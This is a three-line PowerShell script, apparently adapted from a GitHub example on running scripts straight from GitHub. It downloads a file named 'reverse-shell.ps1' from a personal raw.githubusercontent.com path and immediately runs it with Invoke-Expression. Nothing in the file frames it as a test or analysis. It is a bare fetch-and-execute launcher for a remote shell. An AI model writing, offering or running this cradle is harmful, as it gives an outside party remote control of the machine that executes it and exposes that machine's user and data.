#https://github.com/tomarbuthnot/Run-PowerShell-Directly-From-GitHub/blob/master/Run-FromGithub.ps1
$ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/mephisto76/coding/reverse-shell.ps1
Invoke-Expression $($ScriptFromGithHub.Content)
